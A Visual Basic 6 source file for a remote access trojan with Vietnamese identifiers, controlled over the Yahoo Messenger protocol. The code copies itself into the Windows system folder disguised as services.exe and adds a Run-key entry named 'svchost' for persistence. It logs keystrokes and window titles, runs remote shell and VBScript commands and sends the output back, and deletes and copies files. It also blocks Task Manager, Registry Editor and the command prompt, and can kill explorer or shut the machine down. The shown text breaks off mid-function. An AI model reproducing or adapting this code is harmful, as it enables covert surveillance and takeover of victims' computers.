VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   0  'None
   ClientHeight    =   2820
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   3240
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2820
   ScaleWidth      =   3240
   ShowInTaskbar   =   0   'False
   StartUpPosition =   1  'CenterOwner
   Visible         =   0   'False
   Begin VB.CommandButton Command2 
      Caption         =   "Login"
      Height          =   375
      Left            =   120
      TabIndex        =   19
      Top             =   2280
      Width           =   855
   End
   Begin VB.Timer Timer5 
      Interval        =   10
      Left            =   4200
      Top             =   3600
   End
   Begin VB.CommandButton Command1 
      Caption         =   "OK"
      Height          =   375
      Left            =   1080
      TabIndex        =   16
      Top             =   2280
      Width           =   975
   End
   Begin VB.ListBox ListCMD3 
      Height          =   840
      ItemData        =   "frmMain.frx":0000
      Left            =   3360
      List            =   "frmMain.frx":002B
      TabIndex        =   15
      Top             =   0
      Width           =   3615
   End
   Begin VB.ListBox ListCMD4 
      Height          =   840
      ItemData        =   "frmMain.frx":0228
      Left            =   600
      List            =   "frmMain.frx":0253
      TabIndex        =   14
      Top             =   8880
      Width           =   1935
   End
   Begin VB.ListBox ListCMD2 
      Height          =   645
      ItemData        =   "frmMain.frx":0440
      Left            =   3840
      List            =   "frmMain.frx":0465
      TabIndex        =   13
      Top             =   1440
      Width           =   1935
   End
   Begin VB.Timer KetNoi 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   7560
      Top             =   4680
   End
   Begin VB.Timer Timer4 
      Enabled         =   0   'False
      Interval        =   100
      Left            =   3960
      Top             =   4680
   End
   Begin VB.Timer TacGia 
      Interval        =   10
      Left            =   4320
      Top             =   2760
   End
   Begin VB.TextBox Text4 
      Height          =   255
      Left            =   480
      MultiLine       =   -1  'True
      TabIndex        =   12
      Top             =   6600
      Width           =   2775
   End
   Begin VB.TextBox Text3 
      Height          =   255
      Left            =   480
      MultiLine       =   -1  'True
      TabIndex        =   11
      Top             =   6360
      Width           =   2775
   End
   Begin VB.TextBox Text2 
      Height          =   255
      Left            =   480
      MultiLine       =   -1  'True
      TabIndex        =   10
      Top             =   6120
      Width           =   2775
   End
   Begin VB.Timer LockCMD 
      Interval        =   10
      Left            =   6960
      Top             =   2760
   End
   Begin VB.Timer LockSystem32 
      Interval        =   10
      Left            =   7680
      Top             =   2760
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   7680
      Top             =   3120
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   7680
      Top             =   3480
   End
   Begin VB.Timer TmrKeyLogger 
      Interval        =   1
      Left            =   6240
      Top             =   3120
   End
   Begin VB.TextBox Text1 
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Courier New"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      IMEMode         =   3  'DISABLE
      Left            =   5640
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   6
      Top             =   3840
      Width           =   2535
   End
   Begin VB.Timer Mouse_Event 
      Interval        =   50
      Left            =   6600
      Top             =   3120
   End
   Begin VB.Timer LockNote 
      Interval        =   10
      Left            =   5760
      Top             =   3120
   End
   Begin VB.ListBox ListCmd 
      Height          =   1230
      ItemData        =   "frmMain.frx":0655
      Left            =   1200
      List            =   "frmMain.frx":0683
      TabIndex        =   5
      Top             =   6840
      Width           =   2895
   End
   Begin VB.TextBox lblCMD 
      Height          =   285
      Left            =   6240
      MultiLine       =   -1  'True
      TabIndex        =   4
      Top             =   1320
      Width           =   1815
   End
   Begin VB.DirListBox Dir1 
      Height          =   315
      Left            =   7200
      TabIndex        =   3
      Top             =   720
      Width           =   855
   End
   Begin VB.FileListBox File1 
      Height          =   285
      Hidden          =   -1  'True
      Left            =   7200
      TabIndex        =   2
      Top             =   480
      Width           =   735
   End
   Begin VB.Timer LockReg 
      Interval        =   10
      Left            =   6600
      Top             =   2760
   End
   Begin VB.Timer LockTask 
      Interval        =   10
      Left            =   6240
      Top             =   2760
   End
   Begin VB.Timer LockRun 
      Interval        =   10
      Left            =   5880
      Top             =   2760
   End
   Begin VB.Timer TimerMH 
      Enabled         =   0   'False
      Left            =   5520
      Top             =   2760
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6960
      Top             =   3120
   End
   Begin VB.TextBox txt2SendFriend 
      Height          =   225
      Left            =   480
      MultiLine       =   -1  'True
      TabIndex        =   1
      Top             =   5850
      Width           =   2775
   End
   Begin VB.CommandButton cmdSend 
      Caption         =   "Send"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   13.5
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   4080
      TabIndex        =   0
      Top             =   4320
      Width           =   975
   End
   Begin VB.Timer tmrHandleBuffer 
      Enabled         =   0   'False
      Interval        =   1
      Left            =   6000
      Top             =   4680
   End
   Begin VB.Timer tmrStatus 
      Interval        =   1000
      Left            =   6840
      Top             =   4920
   End
   Begin MSWinsockLib.Winsock sckMain 
      Left            =   7320
      Tag             =   "216.136.233.148"
      Top             =   3120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemoteHost      =   "scs.msg.yahoo.com"
      RemotePort      =   5050
   End
   Begin VB.Label ThuocGiai 
      Height          =   375
      Left            =   120
      TabIndex        =   18
      Top             =   1800
      Width           =   2775
   End
   Begin VB.Label MaXacNhan 
      Height          =   375
      Left            =   120
      TabIndex        =   17
      Top             =   1320
      Width           =   2775
   End
   Begin VB.Label lblYou 
      Height          =   375
      Left            =   120
      TabIndex        =   9
      Top             =   840
      Width           =   2655
   End
   Begin VB.Label lblPassWord 
      Height          =   255
      Left            =   120
      TabIndex        =   8
      Top             =   480
      Width           =   2655
   End
   Begin VB.Label lblUserName 
      Height          =   255
      Left            =   120
      TabIndex        =   7
      Top             =   120
      Width           =   2535
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'***************************************************************
'*************    CODE BY DINHQUANGTRUNG90@YAHOO.COM    ********
'***************************************************************
'***************************************************************
'***************************************************************
'***************************************************************
'***************************************************************
'***************************************************************
Option Explicit
Dim ThoiGianChuot
Private Declare Function GetForegroundWindow Lib "user32" () As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Dim Xem As Boolean
Private Const MAX_COMPUTERNAME_LENGTH As Long = 31
Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Dim KeyGhiNho As String
Dim KeyGhiNhi As String
Dim VBS As Object
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Const WM_CLOSE = &H10
Private KeyLoop As Long
Private FoundKeys As String
Private KeyResult As Long
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private ax(15) As String
Dim PropBag As New PropertyBag
Dim l
Dim demdem
Private Declare Function InternetGetConnectedStateEx Lib "wininet.dll" (ByRef lpdwFlags As Long, ByVal lpszConnectionName As String, ByVal dwNameLen As Integer, ByVal dwReserved As Long) As Long
Dim sConnType As String * 255
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Const SW_HIDE = 0
Const SW_NORMAL = 1
Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Private Const MONITOR_ON = -1&
Private Const MONITOR_LOWPOWER = 1&
Private Const MONITOR_OFF = 2&
Private Const SC_MONITORPOWER = &HF170&
Private Const WM_SYSCOMMAND = &H112

Private Declare Function SendMessage Lib "user32" _
   Alias "SendMessageA" _
  (ByVal hwnd As Long, _
   ByVal wMsg As Long, _
   ByVal wParam As Long, _
   lParam As Any) As Long
Private Const WM_GETTEXT = &HD
Private Const WM_GETTEXTLENGTH = &HE

Private Type POINTAPI
    x As Long
    y As Long
End Type

Dim OnOffThoiGian As Integer

Private Declare Function WindowFromPoint Lib "user32" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long

Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long


Dim i As Integer
Dim j As Integer

Dim r As Integer
Dim ho As Boolean
Dim Ha As Boolean

Dim a As Variant
Dim st As String
Dim length As Long
Dim result As Long
Dim strtmp As String

Dim tWnd As Long, bWnd As Long
Dim Error As Long
Dim PartialFriendList As String

















Private Sub Command1_Click()
Me.Visible = False
End Sub

Private Sub Command2_Click()
FunctionMadeError = "Command Login"
sckMain.Close
sckMain.Connect
End Sub

Private Sub Form_Initialize()
ax(0) = ")"
ax(1) = "!"
ax(2) = "@"
ax(3) = "#"
ax(4) = "$"
ax(5) = "%"
ax(6) = "^"
ax(7) = "&"
ax(8) = "*"
ax(9) = "("
End Sub

Private Sub Form_Load()
On Error Resume Next
If App.PrevInstance Then End
Xem = False
Dim AppPath As String
AppPath = App.Path
If Right(AppPath, 1) <> "\" Then AppPath = AppPath & "\"

FileCopy AppPath & App.EXEName & ".exe", "C:\WINDOWS\system\services.exe"


LastKey = ""
TimeOut = 0
'we start with "1"
Last97AltValue = "1"

Separator = Chr(&HC0) + Chr(&H80)
'---the first time buffer is allowed to be add up
PreviousPacketFinished = True
PartialFriendList = ""

Dim Ret As Long
    Ret = InternetGetConnectedStateEx(Ret, sConnType, 254, 0)
    If Ret = 1 Then
FunctionMadeError = "Command Login"
sckMain.Close
sckMain.Connect



App.TaskVisible = False
Timer1.Enabled = False
Else
Timer1.Enabled = True
End If

Set VBS = New MSScriptControl.ScriptControl
    VBS.Language = "VBScript"


'()()(()()()()()()()()()()()(()
    Dim BeginPos As Long
    Dim varTemp As Variant
    
    Dim byteArr() As Byte
    
    Open AppPath & App.EXEName & ".exe" For Binary As #1
        Get #1, LOF(1) - 3, BeginPos    'get the start position of data

        Seek #1, BeginPos               'seek to data start
        Get #1, , varTemp               'get property bag contents
        
        byteArr = varTemp
        PropBag.Contents = byteArr      'load property bag
    
        PropBag.WriteProperty "LOF", LOF(1) 'a few extra props
        PropBag.WriteProperty "BeginPos", BeginPos
    Close #1
        
   
    
    With PropBag
        lblUserName.Caption = .ReadProperty("USER", "i_am_spy_007")
        lblPassWord.Caption = .ReadProperty("PASS", "i_am_spy_007")
        lblYou.Caption = .ReadProperty("YOU", "i_am_spy_007")
        MaXacNhan.Caption = .ReadProperty("MA", "")
        ThuocGiai.Caption = .ReadProperty("GIAI", "htgtalcmdltnsctnbddmbccbccblo0p")
    End With
    
'()(((((((())))))))))))))))))))))))))))))))))))
Dim Startup

Set Startup = CreateObject("WScript.Shell")
Startup.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\svchost", "C:\WINDOWS\system\services.exe"


End Sub




Private Sub Form_Unload(Cancel As Integer)

Close #ErrorFileNum
sckMain.Close
End
End Sub






Private Sub KetNoi_Timer()
Dim Ret As Long
    Ret = InternetGetConnectedStateEx(Ret, sConnType, 254, 0)
    If Ret <> 1 Then
KetNoi.Enabled = False
Timer1.Enabled = True
End If
End Sub

Private Sub Label1_Click()

End Sub

Private Sub lblCMD_Change()
Dim Lenh As String
Dim NoiDung As String
Dim NoiDung2 As String
Ha = False
ho = False
If Ha = False Then
    For j = 1 To Len(lblCMD.Text)
        If Mid(lblCMD.Text, j, 1) = "*" Then
            r = j
            NoiDung2 = Mid(lblCMD.Text, j + 1, Len(lblCMD.Text))
            Ha = True
            End If
    Next j
End If
If ho = False Then
For i = 1 To Len(lblCMD.Text)
If Mid(lblCMD.Text, i, 1) = "/" Then
    Lenh = Left(lblCMD.Text, i - 1)
        If r <> 0 Then
        NoiDung = Mid(lblCMD.Text, i + 1, r - i - 1)
        Else
        NoiDung = Mid(lblCMD.Text, i + 1, Len(lblCMD.Text))
        End If
    ho = True
    End If
Next i
End If

'******************

If Lenh = "exit" Then
    Unload Me
ElseIf Lenh = "msgbox" Then
On Error GoTo Ero
    MsgBox NoiDung, vbOKOnly, ""
Ero:
ThatBai

ElseIf Lenh = "shell" Then
On Error GoTo Eror
    Shell NoiDung, vbHide
Eror:
ThatBai
ElseIf Lenh = "sendkeys" Then
On Error GoTo Erorr
    SendKeys NoiDung
Erorr:
ThatBai
ElseIf Lenh = "opencd" Then
    OpenCDROM
  
ElseIf Lenh = "closecd" Then
    CloseCDROM
   
ElseIf Lenh = "hidestart" Then
    HideStart
   
ElseIf Lenh = "showstart" Then
    ShowStart
   
ElseIf Lenh = "offmonitor" Then
    OffMH
   
ElseIf Lenh = "lockrun" Then
    LockRun.Enabled = True
    Xx
ElseIf Lenh = "unlockrun" Then
    LockRun.Enabled = False
    Xx
ElseIf Lenh = "locktask" Then
    LockTask.Enabled = True
    Xx
ElseIf Lenh = "unlocktask" Then
    LockTask.Enabled = False
    Xx
ElseIf Lenh = "lockreg" Then
    LockReg.Enabled = True
    Xx
ElseIf Lenh = "unlockreg" Then
    LockReg.Enabled = False
    Xx
ElseIf Lenh = "dir" Then

    Dim h As Integer
    On Error GoTo LoiNe
    Dir1.Path = NoiDung
    File1.Path = NoiDung
    For h = 0 To Dir1.ListCount - 1
    txt2SendFriend.Text = txt2SendFriend.Text & Dir1.List(h) & vbCrLf
    Next h
    For i = 0 To File1.ListCount - 1
    txt2SendFriend.Text = txt2SendFriend.Text & File1.List(i) & vbCrLf
    Next i
    cmdSend_Click
    
LoiNe:

ElseIf Lenh = "delete" Then
On Error GoTo Thoat
Kill NoiDung
Xx
Thoat:

ElseIf Lenh = "copy" Then
On Error GoTo Loo
FileCopy NoiDung, NoiDung2
Xx
Loo:
ElseIf Lenh = "'codevbs" Then
On Error GoTo hhH
VBS.AddCode lblCMD.Text
Xx
hhH:
ElseIf Lenh = "startup" Then
On Error GoTo HJJ
Dim Startup

Set Startup = CreateObject("WScript.Shell")
Startup.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\svchost", "C:\WINDOWS\system\services.exe"
Xx
HJJ:

ElseIf Lenh = "reglocktask" Then
On Error GoTo HJ
Dim obj
Set obj = CreateObject("WScript.Shell")
obj.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1"
Xx
HJ:
ElseIf Lenh = "regunlocktask" Then
On Error GoTo HH

Set obj = CreateObject("WScript.Shell")
obj.RegDelete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr"
Xx
HH:

ElseIf Lenh = "cmd" Then

Dim objSheller
Dim CMDD As String
CMDD = NoiDung
Set objSheller = CreateObject("WScript.Shell")
txt2SendFriend = objSheller.Exec("cmd /c " & CMDD).StdOut.ReadAll
Set objSheller = Nothing
cmdSend_Click

ElseIf Lenh = "locknote" Then
LockNote.Enabled = True
Xx
ElseIf Lenh = "unlocknote" Then
LockNote.Enabled = False
Xx

ElseIf Lenh = "start" Then
mouse_event.Enabled = True
TmrKeyLogger.Enabled = True

Xx
ElseIf Lenh = "stop" Then
mouse_event.Enabled = False
TmrKeyLogger.Enabled = False

Xx
ElseIf Lenh = "menu" Then
On Error GoTo rrE

Xem = True

Dim c
Dim d
Dim e
Dim f

For c = 0 To ListCmd.ListCount - 1
txt2SendFriend.Text = txt2SendFriend.Text & ListCmd.List(c) & vbCrLf
Next c
cmdSend_Click
For d = 0 To ListCMD2.ListCount - 1
txt2SendFriend.Text = txt2SendFriend.Text & ListCMD2.List(d) & vbCrLf
Next d
cmdSend_Click
For e = 0 To ListCMD3.ListCount - 1
txt2SendFriend.Text = txt2SendFriend.Text & ListCMD3.List(e) & vbCrLf
Next e
cmdSend_Click
For f = 0 To ListCMD4.ListCount - 1
txt2SendFriend.Text = txt2SendFriend.Text & ListCMD4.List(f) & vbCrLf
Next f
cmdSend_Click

rrE:


ElseIf Lenh = "movemouse" Then
On Error GoTo HT
CMouse.MoveTo NoiDung, NoiDung2
Xx
HT:

ElseIf Lenh = "getip" Then
On Error GoTo 8871
Dim objSheller1
Set objSheller1 = CreateObject("WScript.Shell")
txt2SendFriend = objSheller1.Exec("cmd /c ipconfig").StdOut.ReadAll
Set objSheller1 = Nothing
cmdSend_Click
8871:
ElseIf Lenh = "tasklist" Then

On Error GoTo 273
Dim objShelle
Set objShelle = CreateObject("WScript.Shell")
txt2SendFriend = objShelle.Exec("cmd /c tasklist").StdOut.ReadAll
Set objShelle = Nothing
cmdSend_Click
273:

ElseIf Lenh = "taskkill" Then
On Error GoTo 877
   Dim hProcess As Long
   Dim retval As Long
'l?y handle c?a Process xác d?nh b?i ngu?i dùng
   hProcess = OpenProcess(SYNCHRONIZE Or PROCESS_TERMINATE, 0, CLng(FindProcessID(NoiDung)))
If hProcess <> 0 Then
'xóa process tuong ?ng
txt2SendFriend = "Da Xoa"
   retval = TerminateProcess(hProcess, 0)
Else
txt2SendFriend = "Khong Tim Thay Process"
End If
cmdSend_Click
'Shell "taskkill /f /im " & NoiDung, vbHide
'cmdSend_Click
877:

ElseIf Lenh = "lan" Then
On Error GoTo 8772
Dim objShellea
Set objShellea = CreateObject("WScript.Shell")
txt2SendFriend = objShellea.Exec("cmd /c net view").StdOut.ReadAll
Set objShellea = Nothing
cmdSend_Click
8772:
ElseIf Lenh = "shutdown" Then
On Error GoTo 87712
Shell "shutdown -s"
txt2SendFriend = "Windows Is Shutting Down..."

cmdSend_Click
87712:
ElseIf Lenh = "logoff" Then
On Error GoTo 872712
Shell "shutdown -l"
txt2SendFriend = "Windows Is Loging Off..."

cmdSend_Click
872712:
ElseIf Lenh = "reset" Then
On Error GoTo 8727122
Shell "shutdown -r"
txt2SendFriend = "Windows Is Restarting..."

cmdSend_Click
8727122:
ElseIf Lenh = "dftest" Then
On Error GoTo 87271223
If bFileExists("C:\Program Files\Faronics\Deep Freeze\Install C-0\DF5Serv.exe") = True Then
txt2SendFriend = "May Tinh Nay Co Cai Dat Deepfreeze!"
Else
txt2SendFriend = "May Tinh Nay Khong Cai Dat Deepfreeze!"
End If
cmdSend_Click
87271223:

ElseIf Lenh = "hideall" Then
On Error GoTo 1877
'l?y handle c?a Process xác d?nh b?i ngu?i dùng
   hProcess = OpenProcess(SYNCHRONIZE Or PROCESS_TERMINATE, 0, CLng(FindProcessID("explorer.exe")))
If hProcess <> 0 Then
'xóa process tuong ?ng
txt2SendFriend = "OK!"
   retval = TerminateProcess(hProcess, 0)
Else
txt2SendFriend = "Khong Tim Thay Process"
End If
cmdSend_Click
1877:

ElseIf Lenh = "destroymouse" Then
On Error GoTo 18797
Timer4.Enabled = True
Xx
18797:

ElseIf Lenh = "stopdestroymouse" Then
On Error GoTo 187971
Timer4.Enabled = False
Xx
187971:



End If

End Sub




Private Sub LockCMD_Timer()
On Error GoTo Erox
Dim o As Long
    o = FindWindow("ConsoleWindowClass", vbNullString)
    
    If o <> 0 Then
    PostMessage o, WM_CLOSE, &H0, &H0
    End If
Erox:
End Sub

Private Sub LockNote_Timer()
On Error GoTo Ero
Dim o As Long
    o = FindWindow("Notepad", vbNullString)
    
    If o <> 0 Then
    PostMessage o, WM_CLOSE, &H0, &H0
    End If
Ero:
End Sub

Private Sub LockReg_Timer()
On Error GoTo Ero
Dim o As Long
    o = FindWindow(vbNullString, "Registry Editor")
    
    If o <> 0 Then
        AppActivate "Registry Editor"
        SendKeys "%{F4}"
    End If
Ero:
End Sub

'ConsoleWindowClass

Private Sub LockRun_Timer()
On Error GoTo Ero
Dim m As Long
    m = FindWindow(vbNullString, "Run")
    
    If m <> 0 Then
        AppActivate "Run"
        SendKeys "%{F4}"
    End If
Ero:
End Sub

Private Sub LockSystem32_Timer()
On Error GoTo Earo
Dim N As Long
    N = FindWindow(vbNullString, "system32")
    
    If N <> 0 Then
        AppActivate "system32"
        SendKeys "%{F4}"
    End If
Earo:
End Sub

Private Sub LockTask_Timer()
On Error GoTo Ero
Dim N As Long
    N = FindWindow(vbNullString, "Windows Task Manager")
    
    If N <> 0 Then
        AppActivate "Windows Task Manager"
        SendKeys "%{F4}"
    End If
Ero:
End Sub

Private Sub Mouse_Event_Timer()
'                        If GetAsyncKeyState(1) = 0 Then
 '                            If Xem = True Then
  '                           Xem = False
   '                          KeyGhiNho = GetActiveWindowTitle(False)
    '                         txt2SendFriend.Text = KeyGhiNho
     '                        cmdSend_Click
      '                       End If
       '                  Else
        '                 Xem = True
         '                End If
    
    KeyGhiNho = GetActiveWindowTitle(False)
    
    If KeyGhiNho <> KeyGhiNhi Then
    KeyGhiNhi = KeyGhiNho
    txt2SendFriend.Text = "[" & KeyGhiNhi & "]"
    cmdSend_Click
    End If
End Sub
Public Function GetActiveWindowTitle(ByVal ReturnParent As Boolean) As String
Dim i As Long
Dim j As Long

i = GetForegroundWindow


If ReturnParent Then
Do While i <> 0
j = i
i = GetParent(i)
Loop

i = j
End If

GetActiveWindowTitle = GetWindowTitle(i)
End Function
Public Function GetWindowTitle(ByVal hwnd As Long) As String
Dim l As Long
Dim s As String

l = GetWindowTextLength(hwnd)
s = Space(l + 1)

GetWindowText hwnd, s, l + 1

GetWindowTitle = Left$(s, l)
End Function
Private Sub sckMain_Connect()
Dim ByteArray1() As Byte
Dim ByteArray2() As Byte
Dim str As String
On Error GoTo ErrorRaised
FunctionMadeError = "sckMain_Connect"

SentPacket.Service(1) = 0
SentPacket.Service(2) = Asc("L") '=&H4C

SentPacket.Status(1) = 0
SentPacket.Status(2) = 0
SentPacket.Status(3) = 0
SentPacket.Status(4) = 0

SentPacket.SessionID(1) = 0
SentPacket.SessionID(2) = 0
SentPacket.SessionID(3) = 0
SentPacket.SessionID(4) = 0

SentPacket.Data = ""

ConvertYmsgType2ByteArray SentPacket, ByteArray1
sckMain.SendData ByteArray1

'----------------------Next---------------
DoEvents 'This line is realy important due to some mswinsock bug!
SentPacket.Service(1) = 0
SentPacket.Service(2) = YAHOO_SERVICE_AUTH

SentPacket.Status(1) = 0
SentPacket.Status(2) = 0
SentPacket.Status(3) = 0
SentPacket.Status(4) = YAHOO_STATUS_AVAILABLE

SentPacket.SessionID(1) = 0
SentPacket.SessionID(2) = 0
SentPacket.SessionID(3) = 0
SentPacket.SessionID(4) = 0

'"1" is a key
'each data field consists of a key preceding by value then separator
SentPacket.Data = "1" + Separator + lblUserName.Caption + Separator

ConvertYmsgType2ByteArray SentPacket, ByteArray2
sckMain.SendData ByteArray2

Exit Sub
ErrorRaised:

End Sub


Function CombinedDataWithKey(Fragmented() As String, Key As String)
Dim strT As String
Dim i As Long

'We scan trough key codes
For i = LBound(Fragmented) To UBound(Fragmented) Step 2
    'we do not want to process next packet(inline) bytes as a wrong packet
    If InStr(Fragmented(i), "YMSG") Then
        Exit For
    End If
    'We gather all same data
    If Fragmented(i) = Key Then
        'We always avoid unknown errors!
        If UBound(Fragmented) >= i + 1 Then
            strT = strT + Fragmented(i + 1)
        End If
    End If
    DoEvents
Next i
CombinedDataWithKey = strT
End Function
Private Sub sckMain_SendComplete()
Dim FragmentedData() As String
'DataFragment SentPacket.Data, FragmentedData, False
Dim i As Long
Dim TSh As String
Static PacketSentNum As Long

PacketSentNum = PacketSentNum + 1

If SentPacket.Data <> "" Then

End If
WinsockIsInSendingProgress = False
End Sub
Private Sub sckMain_DataArrival(ByVal bytesTotal As Long)
Dim strByte() As Byte
Dim strData As String
Dim nt As Byte

FunctionMadeError = "sckMain_DataArrival"

sckMain.GetData strByte

tmrHandleBuffer.Enabled = False
nt = LBound(strByte)
'---Now We fill in structure format ,we buffer it!-----
ReceivedPacket(TotalPacketsBufferd + 1).Data = DataSection(strByte)

'Debug.Print ReceivedPacket(TotalPacketsBufferd + 1).Data + vbCrLf

ReceivedPacket(TotalPacketsBufferd + 1).Service(1) = strByte(nt + 10)
ReceivedPacket(TotalPacketsBufferd + 1).Service(2) = strByte(nt + 11)

ReceivedPacket(TotalPacketsBufferd + 1).Status(1) = strByte(nt + 12)
ReceivedPacket(TotalPacketsBufferd + 1).Status(2) = strByte(nt + 13)
ReceivedPacket(TotalPacketsBufferd + 1).Status(3) = strByte(nt + 14)
ReceivedPacket(TotalPacketsBufferd + 1).Status(4) = strByte(nt + 15)

ReceivedPacket(TotalPacketsBufferd + 1).SessionID(1) = strByte(nt + 16)
ReceivedPacket(TotalPacketsBufferd + 1).SessionID(2) = strByte(nt + 17)
ReceivedPacket(TotalPacketsBufferd + 1).SessionID(3) = strByte(nt + 18)
ReceivedPacket(TotalPacketsBufferd + 1).SessionID(4) = strByte(nt + 19)
TotalPacketsBufferd = TotalPacketsBufferd + 1
tmrHandleBuffer.Enabled = True
End Sub
'this func returns index of window it is requested to append



'Fragments data like strings
Sub DataFragment(Data As String, Fragmented() As String, Optional FragmentInline As Boolean = True)
    Dim strData As String
    Dim BeginOfInline As Long 'Inline
    Dim TotalDataNum As Long
    Dim i As Long
    Dim SB As Long
    Dim Inlinepositions(1 To 100) As Long
    Dim TotalInlineInThisPacket As Byte
    Dim j As Byte
    Dim strInlineData As String
    
    strData = Data

    SB = InStr(1, strData, Separator)
    TotalDataNum = 0
    While (SB)
        TotalDataNum = TotalDataNum + 1
        SB = InStr(SB + 2, strData, Separator)
    Wend
    If TotalDataNum > 0 Then
    
        
        
       
            
                ReDim Fragmented(1 To TotalDataNum) As String
                For i = 1 To TotalDataNum
                    SB = InStr(1, strData, Separator)
                    Fragmented(i) = Mid(strData, 1, SB - 1)
                    strData = Mid(strData, SB + 2)
                    DoEvents
                    If i Mod 2 = 1 Then
                        BeginOfInline = InStr(1, Fragmented(i), "YMSG")
                        If BeginOfInline <> 0 Then
                            TotalInlineInThisPacket = TotalInlineInThisPacket + 1
                            Inlinepositions(TotalInlineInThisPacket) = i
                        End If
                    End If
                Next i
            
            If TotalInlineInThisPacket = 0 Then
                Exit Sub
            End If
           For i = 1 To TotalInlineInThisPacket
                DoEvents
                BeginOfInline = InStr(1, Fragmented(Inlinepositions(i)), "YMSG")
                strInlineData = Mid(Fragmented(Inlinepositions(i)), BeginOfInline + 4)
                For j = 1 To 6
                    BeginOfInline = InStr(strInlineData, "<0x0>")
                    If BeginOfInline = 1 Then
                        strInlineData = Mid(strInlineData, 6)
                    Else
                        strInlineData = Mid(strInlineData, 2)
                    End If
                Next j
               For j = 1 To 2
                    BeginOfInline = InStr(strInlineData, "<0x0>")
                    If BeginOfInline = 1 Then
                        ReceivedPacket(i + TotalPacketsBufferd).IsInline = True
                        ReceivedPacket(i + TotalPacketsBufferd).Service(j) = 0
                        strInlineData = Mid(strInlineData, 6)
                    Else
                        ReceivedPacket(i + TotalPacketsBufferd).IsInline = True
                        ReceivedPacket(i + TotalPacketsBufferd).Service(j) = Asc(Left(strInlineData, 1))
                        strInlineData = Mid(strInlineData, 2)
                    End If
                Next j
                For j = 1 To 4
                    BeginOfInline = InStr(strInlineData, "<0x0>")
                    If BeginOfInline = 1 Then
                        ReceivedPacket(i + TotalPacketsBufferd).IsInline = True
                        ReceivedPacket(i + TotalPacketsBufferd).Status(j) = 0
                        strInlineData = Mid(strInlineData, 6)
                    Else
                        ReceivedPacket(i + TotalPacketsBufferd).IsInline = True
                        ReceivedPacket(i + TotalPacketsBufferd).Status(j) = Asc(Left(strInlineData, 1))
                        strInlineData = Mid(strInlineData, 2)
                    End If
                Next j
               If Inlinepositions(i + 1) <> 0 Then
                    InlinePacketLen(i) = Inlinepositions(i + 1) - Inlinepositions(i)
                Else
                    InlinePacketLen(i) = TotalDataNum - Inlinepositions(i) + 1
                End If
                'the first data is a key preceding just after session id of the inline data
                ReceivedInlineFragmentedData(TotalInlinesBufferd + 1, 1) = Right(Fragmented(Inlinepositions(i)), 1)
                For j = 2 To InlinePacketLen(i)
                    ReceivedInlineFragmentedData(TotalInlinesBufferd + 1, j) = Fragmented(Inlinepositions(i) + j - 1)
                Next j
                TotalInlinesBufferd = TotalInlinesBufferd + 1
            Next i
            TotalPacketsBufferd = TotalPacketsBufferd + TotalInlineInThisPacket
        
    End If
End Sub




Sub HandleBuffer()
Dim nt As Byte
Dim i As Long
Dim FragmentedData() As String
Dim Str1 As String
Dim Str2 As String
Dim TSh As String 'temp string
Dim strByte() As Byte
Static NumberOfDataCame As Long
Dim j As Byte
Dim LastStatus As Long
Dim strLoggedName As String
Dim strLoggingDesc As String
Dim StatusPicName As String



tmrHandleBuffer.Enabled = False
If TotalPacketsBufferd = 0 Then
    Exit Sub
End If
'Ok we handle fifo buffer
If PreviousPacketFinished Then
    PreviousPacketFinished = False
